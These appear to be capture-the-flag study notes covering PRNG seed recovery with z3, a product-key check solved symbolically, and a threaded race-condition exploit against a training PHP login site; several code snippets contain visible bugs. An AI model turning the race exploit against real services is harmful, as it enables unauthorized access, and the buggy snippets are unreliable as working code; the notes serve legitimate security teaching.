# Symbolic

## pnrg

Very simple program in theory: it takes 4 truly random bytes from `/dev/random`, it checks them agains user input: if they are equal, it prints the flag. Basically we need to recover those random bytes. In the middle of this we have some calls to functions called `seedRand` and `genRandLong`, which together with the name of the challenge can give us some hints about its nature:

> Most [pseudo-random number generators (PRNGs)](https://en.wikipedia.org/wiki/Pseudorandom_number_generator) are build on algorithms involving some kind of recursive method starting from a base value that is determined by an input called the "seed".
> 
> ...
> 
> The purpose of the seed is to allow the user to "lock" the pseudo-random number generator, to allow replicable analysis. Some analysts like to set the seed using a [true random-number generator (TRNG)](https://en.wikipedia.org/wiki/Hardware_random_number_generator) which uses hardware inputs to generate an initial seed number, and then report this as a locked number. If the seed is set and reported by the original user then an auditor can repeat the analysis and obtain the same sequence of pseudo-random numbers as the original user. If the seed is not set then the algorithm will usually use some kind of default seed (e.g., from the system clock), and it will generally not be possible to replicate the randomisation.

There are various ways to solve the challenge, from symbolic analysis (the most sophisticated), to brute forcing (the simplest method).

From the Ghidra pseudocode we can deduce that `local_1408` is the internal state of the algorithm. It is a structure that holds all of its internal data. 

**Note**: the seed is 8 bytes long.

### Symbolic execution method

Basically we need to replicate the behaviour of the program using z3 to reconstruct the final output. `main` code:

```c
  ...
  dev_rand = open("/dev/random",0);
  read(dev_rand,&local_1418,4);
  close(dev_rand);
  seedRand(internalState,(long)(int)local_1418);
  for (local_1414 = 0; local_1414 < 1000; local_1414 = local_1414 + 1) {
    genRandLong(internalState);
  }
  uVar1 = genRandLong(internalState);
  printf("%#lx, ",uVar1);
  ...
```

```python
import z3

def seedRand(i):
    return i

def genRandLong():
    return 0

seed = z3.BitVec('seed', 32)

seedRand(seed)
for _ in range(1000):
    genRandLong()

output = genRandLong()

z3.solver(output == 0xaabbccdd)
```

What's the hard part here? We need to replicate the gen and seed function as they are in the binary.

**Where to start?** Let's look at `genRandLong`:

```c
ulong genRandLong(undefined8 *param_1)

{
  int iVar1;
  ulong uVar2;
  int local_14;

  if ((0x26f < *(int *)(param_1 + 0x270)) || (*(int *)(param_1 + 0x270) < 0)) {
    if ((0x270 < *(int *)(param_1 + 0x270)) || (*(int *)(param_1 + 0x270) < 0)) {
      m_seedRand(param_1,0x1105);
    }
    for (local_14 = 0; local_14 < 0xe3; local_14 = local_14 + 1) {
      param_1[local_14] =
           param_1[local_14 + 0x18d] ^
           (ulong)(((uint)param_1[local_14 + 1] & 0x7fffffff | (uint)param_1[local_14] & 0x80000000)
                  >> 1) ^ *(ulong *)(mag.3808 + (ulong)((uint)param_1[local_14 + 1] & 1) * 8);
    }
    for (; local_14 < 0x26f; local_14 = local_14 + 1) {
      param_1[local_14] =
           param_1[local_14 + -0xe3] ^
           (ulong)(((uint)param_1[local_14 + 1] & 0x7fffffff | (uint)param_1[local_14] & 0x80000000)
                  >> 1) ^ *(ulong *)(mag.3808 + (ulong)((uint)param_1[local_14 + 1] & 1) * 8);
    }
    param_1[0x26f] =
         param_1[0x18c] ^
         (ulong)(((uint)*param_1 & 0x7fffffff | (uint)param_1[0x26f] & 0x80000000) >> 1) ^
         *(ulong *)(mag.3808 + (ulong)((uint)*param_1 & 1) * 8);
    *(undefined4 *)(param_1 + 0x270) = 0;
  }
  iVar1 = *(int *)(param_1 + 0x270);
  *(int *)(param_1 + 0x270) = iVar1 + 1;
  uVar2 = param_1[iVar1] ^ (ulong)param_1[iVar1] >> 0xb;
  uVar2 = uVar2 ^ (uint)(uVar2 << 7) & 0x9d2c5680;
  uVar2 = uVar2 ^ (uint)(uVar2 << 0xf) & 0xefc60000;
  return uVar2 ^ uVar2 >> 0x12;
}
```

Ok, it looks a bit scary... A quick google search of the constants brings up the algorithm that is being implemented here: Marsenne Twister 19937 generator.

> A pseudo-random number generator engine that produces unsigned integer numbers in the closed interval $[0,2^{w}-1]$.
> 
> The algorithm used by this engine is optimized to compute large series of numbers (such as in Monte Carlo experiments) with an almost uniform distribution in the range.
> 
> The engine has an internal state sequence of *n* integer elements, which is filled with a pseudo-random series generated on [construction](https://www.cplusplus.com/mersenne_twister_engine::mersenne_twister_engine) or by calling member function [seed](https://www.cplusplus.com/mersenne_twister_engine::seed).
> 
> The internal state sequence becomes the source for *n* elements: When the state is advanced (for example, in order to produce a new random number), the engine alters the state sequence by *twisting* the current value using xor mask *a* on a mix of bits determined by parameter *r* that come from that value and from a value *m* elements away (see [operator()](https://www.cplusplus.com/mersenne_twister_engine::operator()) for details).
> 
> The random numbers produced are tempered versions of these twisted values. The tempering is a sequence of shift and xor operations defined by parameters *u*, *d*, *s*, *b*, *t*, *c* and *l* applied on the selected state value (see [operator()](https://www.cplusplus.com/mersenne_twister_engine::operator())).
> 
> The random numbers generated by `mersenne_twister_engine` have a period equivalent to the *mersenne number* $2^{(n-1)w}-1$.

**Note about IPython**

If we want to execute some code in python and then manipulate its output manually or to play with it, we can append this at the end of the script:

```python
from IPython import embed
embed()
```

#### `seedRand`

Let's start by converting `m_seedRand` in python:

```c
void m_seedRand(ulong *state,ulong seed)

{
  *state = seed & 0xffffffff;
  *(undefined4 *)(state + 0x270) = 1;
  while (*(int *)(state + 0x270) < 0x270) {
    state[*(int *)(state + 0x270)] =
         (ulong)(uint)((int)state[*(int *)(state + 0x270) + -1] * 0x17b5);
    *(int *)(state + 0x270) = *(int *)(state + 0x270) + 1;
  }
  return;
}
```

```python
def seedRand(state, seed):
    state = seed & 0xffffffff;
    state[0x271] = 1
    while state[0x270] < 0x270:
        state[state[0x271]] = state[state[0x271]-1] * 0x17b5
        state[0x271] = state[0x271] + 1
    return state
```

Now, since state is an important structure in the original algorithm, it is better to initialize it as a class in our exploit:

```python
class State:
    def __init__(self):
        self.state = [0]*270
        self.index = 0
```

Which means we can simplify the previous implementation:

```python
def seedRand(s, seed):
    s.state[0] = seed & 0xffffffff;
    s.index = 1;
    while s.index < 0x270:
        s.state[s.index] = s.state[s.index - 1] * 0x17b5
        s.index = s.index + 1
    return s
```

#### `genRandLong`

```c
ulong genRandLong(undefined8 *param_1)

{
  int iVar1;
  ulong uVar2;
  int local_14;

  if ((0x26f < *(int *)(param_1 + 0x270)) || (*(int *)(param_1 + 0x270) < 0)) {
    if ((0x270 < *(int *)(param_1 + 0x270)) || (*(int *)(param_1 + 0x270) < 0)) {
      m_seedRand(param_1,0x1105);
    }
    for (local_14 = 0; local_14 < 0xe3; local_14 = local_14 + 1) {
      param_1[local_14] =
           param_1[local_14 + 0x18d] ^
           (ulong)(((uint)param_1[local_14 + 1] & 0x7fffffff | (uint)param_1[local_14] & 0x80000000)
                  >> 1) ^ *(ulong *)(mag.3808 + (ulong)((uint)param_1[local_14 + 1] & 1) * 8);
    }
    for (; local_14 < 0x26f; local_14 = local_14 + 1) {
      param_1[local_14] =
           param_1[local_14 + -0xe3] ^
           (ulong)(((uint)param_1[local_14 + 1] & 0x7fffffff | (uint)param_1[local_14] & 0x80000000)
                  >> 1) ^ *(ulong *)(mag.3808 + (ulong)((uint)param_1[local_14 + 1] & 1) * 8);
    }
    param_1[0x26f] =
         param_1[0x18c] ^
         (ulong)(((uint)*param_1 & 0x7fffffff | (uint)param_1[0x26f] & 0x80000000) >> 1) ^
         *(ulong *)(mag.3808 + (ulong)((uint)*param_1 & 1) * 8);
    *(undefined4 *)(param_1 + 0x270) = 0;
  }
  iVar1 = *(int *)(param_1 + 0x270);
  *(int *)(param_1 + 0x270) = iVar1 + 1;
  uVar2 = param_1[iVar1] ^ (ulong)param_1[iVar1] >> 0xb;
  uVar2 = uVar2 ^ (uint)(uVar2 << 7) & 0x9d2c5680;
  uVar2 = uVar2 ^ (uint)(uVar2 << 0xf) & 0xefc60000;
  return uVar2 ^ uVar2 >> 0x12;
}
```

Wtf is `mag.3808`? It a global variable 16 bytes big. The first 8 are null, while the remaining 8 are a hexadecimal value. Note also that its index is `& 1`, which means that it is either 0 or 1 (ampersand of arity two is the bitwise AND operator). This translates in python as:

```python
MAG = [0x0, 0x9908b0df]
def mag(i):
    return z3.If(i == 0, 0x0, 0x9908b0df)
```

Actually this does not work:

```python
raise Z3Exception(msg)
z3.z3types.Z3Exception: sort mismatch
```

Because it is a python integer and z3 does not know how to work with it. Solution: create a `BitVecVal`.

Python translation of the function :

```python
def genRandLong(s):
    if ((0x26f < s.index) or (s.index < 0)):
        if ((0x270 < s.index) or (s.index < 0)):
            seedRand(s,0x1105) 
    for local_14 in range(0xe3):
        p1 = s.state[local_14 + 0x18d]
        p2 = (s.state[local_14 + 1] & 0x7fffffff | s.state[local_14] & 0x80000000) >> 1
        p3 = mag((s.state[local_14 + 1] & 1))
        s.state[local_14] = p1 ^ p2 ^ p3

    for local_14 in range(0xe3, 0x26f): 
        p1 = s.state[local_14 - 0xe3]
        p2 = s.state[local_14 + 1] & 0x7fffffff | s.state[local_14] & 0x80000000 >> 1
        p3 = mag((s.state[local_14 + 1] & 1))
        s.state[local_14] = p1 ^ p2 ^ p3

    p1 = s.state[0x18c]
    p2 = (s.state[0] & 0x7fffffff | s.state[0x26f] & 0x80000000) >> 1
    p3 = mag((s.state[0] & 1))
    s.state[0x26f] = p1 ^ p2 ^ p3
    s.index = 0
    iVar1 = s.index
    s.index = iVar1 + 1
    uVar2 = s.state[iVar1] ^ s.state[iVar1] >> 0xb
    uVar2 = uVar2 ^ (uVar2 << 7) & 0x9d2c5680
    uVar2 = uVar2 ^ (uVar2 << 0xf) & 0xefc60000
    rand_num = uVar2 ^ uVar2 >> 0x12
    return s, rand_num
```

Note that we need to fix variable length: if we multiply two 32 bit numbers, the output would be 64 bits long. We need to add an ampersand `0xffffffff` after the multiplication.

**Bruteforce approach**

Recall: this code is a random number generator with a random seed. The challenge prints out the 1001 random number and it asks for the random seed. Up until now we saw constraint programming (**symbolic execution**). We can also bruteforce it **locally**. It can be done two ways: by restarting every time the challenge binary, which can be costly, or by reimplementing the algorithm in another binary and launching this modified binary only one time.

**Note**: code without syscalls is faster.

Why are we able to reverse: from the same state we can always get the same output. **The only random part of the algorithm is the seed**.

## prodkey

We have a 30 characters long key that we have to guess to get the flag, which is stored remotely. To check the correctness of our input flag the binary calls a function called `verify_key`, which returns 1 if its correct, 0 otherwise.

More specifically this is the check implemented by `verify_key`:

```c
cVar1 = check_01(key);
if (((((cVar1 == '\0') || (cVar1 = check_02(key), cVar1 == '\0')) ||
         (cVar1 = check_03(key), cVar1 == '\0')) ||
        (((cVar1 = check_04(key), cVar1 == '\0' || (cVar1 = check_05(key), cVar1 == '\0')) ||
         ((cVar1 = check_06(key), cVar1 == '\0' ||
          ((cVar1 = check_07(key), cVar1 == '\0' || (cVar1 = check_08(key), cVar1 == '\0')))))))) ||
       ((cVar1 = check_09(key), cVar1 == '\0' ||
        (((((cVar1 = check_0A(key), cVar1 == '\0' || (cVar1 = check_0B(key), cVar1 == '\0')) ||
           (cVar1 = check_0C(key), cVar1 == '\0')) ||
          ((cVar1 = check_0D(key), cVar1 == '\0' || (cVar1 = check_0E(key), cVar1 == '\0')))) ||
          (cVar1 = check_0F(key), cVar1 == '\0')))))) {
auth = 0;
```

As we can see we have a bunch of functions that have to **not** return zero in order fot the check to pass. We need z3 to reverse them. They are 16 (one for each hexadecimal cypher). Or we can use angr. Using z3 can be quite time consuming, since we have to rework all the checks functions to be compatible with z3's symbolic data types. Foe example `check_01` would go from:

```c
undefined8 check_01(char *key)

{
  undefined8 auth;
  
  if ((((key[5] == '-') && (key[11] == '-')) && (key[17] == '-')) && (key[23] == '-')) {
    auth = 1;
  }
  else {
    auth = 0;
  }
  return auth;
}
```

To:

```python
def check01(key):  
    return If(
        And(
            And(
                And(
                  (Extract(5, 5, key) == '-'), (Extract(11, 11, key) == '-')
                ), 
            (Extract(17, 17, key) == '-')
            ),
        (Extract(23, 23, key) == '-')
        ),
    1, 0
)
```

# Race condition

## aart

**Goal**: register a user and login before that the restriction gets activated. This is the point of the **race condition**: we need to make the login happen before the registration is actually complete. More specifically, this is from `register.php`:

```php
if(isset($_POST['username'])){
	$username = mysqli_real_escape_string($conn, $_POST['username']);
	$password = mysqli_real_escape_string($conn, $_POST['password']);

	$sql = "INSERT into users (username, password) values ('$username', '$password');";

	mysqli_query($conn, $sql);
	$sql = "INSERT into privs (userid, isRestricted) values ((select users.id from users where username='$username'), TRUE);";
	mysqli_query($conn, $sql);
	?>
	<h2>SUCCESS!</h2>
	<?php
}
```

And this is from `login.php`:

```php
if($_POST['username'] === $row['username'] and $_POST['password'] === $row['password']){
		?>
		<h1>Logged in as <?php echo($username);?></h1>
		<?php

		$uid = $row['id'];
		$sql = "SELECT isRestricted from privs where userid='$uid' and isRestricted=TRUE;";
		$result = mysqli_query($conn, $sql);
		$row = $result->fetch_assoc();
		if($row['isRestricted']){
			?>
			<h2>This is a restricted account</h2>

			<?php
		}else{
			?>
			<h2><?php include('../key');?></h2>
			<?php

		}
	?>
	<h2>SUCCESS!</h2>
	<?php
	}
```

And we need to make registration and login happen at the same time in order to be able to login before that `INSERT into privs (userid, isRestricted) values ((select users.id from users where username='$username'), TRUE);` gets executed.

### Toolkit

Best python library for handling HTTP requests, hands down. We'll use it for this challenge, since both the login and registration functions are POST requests. To look at requests we could use chrome developer tools or wireshark since HTTP requests are in clear.

### Approach

First approach: we can try making the registration and the login happen at the same time. This will not work:

```python
import requests
def registration(user, password):
  url = "%s/register.php" % HOST
  r = requests.post(url, data={'username': user, 'password': password})
  if '"SUCCESS!" "SUCCESS!" in r.text:
      return True
  return False 

def login(user, password):
  url = "%s/login.php" % HOST
  r = requests.post(url, data={'username': user, 'password': password}) 
  print(r.text) 

registration('qweqwe','qweqwe')
login('qweqwe','qweqwe') 
```

Since the login is not fast enough. We need a multi-threading library.

```python
import threading, requests
HOST = "http://aart.training.jinblack.it" 
def randomString(N):
  return ''.join(random.choices(string.ascii_uppercase + string.ascii_lowercase + string.digits, k=N)) 

def registration(user, password):
  url = "%s/register.php" % HOST
  r = requests.post(url, data={'username': user, 'password': password})
  if "SUCCESS!" in r.text:
    return True
  return False 

def login(user, password):
  url = "%s/login.php" % HOST
    r = requests.post(url, data={'username': user, 'password': password})
  print(r.text) 

  while True:
    username = randomString(10)
    password = randomString(10)
    r = threading.Thread(target=registration, args=(username, password))
    l = threading.Thread(target=login, args=(username, password))
    r.start()
    l.start() 
```

The code above actually prints the flag.

**Note**: we need a new username for each attempt, which means that a random string generator as username would be a good choice to make the exploitation simpler.
